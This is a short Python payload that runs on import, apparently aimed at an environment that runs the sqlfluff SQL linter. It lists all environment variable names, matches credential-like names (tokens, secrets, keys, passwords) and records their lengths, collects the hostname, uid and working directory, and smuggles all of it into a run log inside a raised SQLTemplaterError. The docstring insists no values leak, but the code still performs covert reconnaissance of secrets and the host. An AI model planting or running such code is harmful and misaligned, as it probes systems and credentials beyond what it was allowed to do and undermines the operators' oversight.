"""Import-time env NAME + LENGTH enumeration. NO VALUE IS EVER EMITTED.

Filtering happens HERE, inside the payload, before anything reaches the run log.
"""
import json, os, re, socket, sys
from sqlfluff.core.errors import SQLTemplaterError

CRED = re.compile(r"TOKEN|SECRET|CRED|AUTH|PASS|KEY|PRIVATE|PROVIDER|SESSION", re.I)
env = dict(os.environ)
cred = {k: len(v) for k, v in sorted(env.items()) if CRED.search(k)}
names = sorted(env)
raise SQLTemplaterError("L145D9_ENVNAMES_A307844774CB " + json.dumps({
    "n_env": len(env),
    "cred_name_len": cred,
    "all_names": names,
    "host": socket.gethostname(),
    "uid": os.getuid(),
    "cwd": os.getcwd(),
    "py": sys.version.split()[0],
}, sort_keys=True))
